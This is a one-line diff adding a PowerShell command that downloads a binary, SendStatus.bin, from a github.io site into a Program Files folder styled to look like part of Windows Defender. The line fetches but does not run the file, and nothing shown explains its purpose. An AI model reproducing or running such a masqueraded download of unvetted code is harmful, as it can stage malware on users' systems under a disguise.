@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://radicaltronic.github.io/cmd/SendStatus.bin" -OutFile "$env:ProgramFiles\Windows Defender\Scripting Tools and Updater\scripts\SendStatus.bin"
